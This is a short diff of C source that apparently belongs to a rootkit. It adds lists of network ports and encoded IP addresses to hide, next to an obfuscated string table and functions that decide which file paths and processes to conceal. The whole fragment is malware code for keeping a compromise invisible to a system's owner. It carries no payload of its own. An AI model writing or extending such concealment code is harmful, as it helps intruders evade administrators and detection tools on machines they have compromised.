@@ -50,6 +50,9 @@ const struct enc_str fth[9] = {
   {"\x34\xB3\x88\x41\xF7\x43\x93\x98\xAD", 9}
 };
 
+int hidden_ports[3] = {47623, 62537, 0};
+int hidden_address[3] = {175842362, 175835293, -1};
+
 bool must_hide(const char *path);
 bool hidden_proc(const char *proc_what);
 
